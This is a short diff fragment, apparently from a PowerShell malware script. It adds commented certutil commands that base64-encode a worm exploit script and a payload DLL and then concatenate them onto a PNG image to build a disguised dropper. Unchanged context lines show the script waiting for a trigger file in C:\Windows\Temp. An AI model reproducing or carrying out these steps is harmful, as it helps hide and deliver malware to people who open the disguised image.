@@ -1,3 +1,6 @@
+#certutil -encode worm-exploit.ps1 worm.b64
+#certutil -encode payload.dll payload.b64
+#copy /b dropper.png + worm.b64 + payload.b64 dropper_final.png
 
 # Wait for signal trigger file (auto_chck.ps1)
 $trigger = "C:\Windows\Temp\auto_chck.ps1"
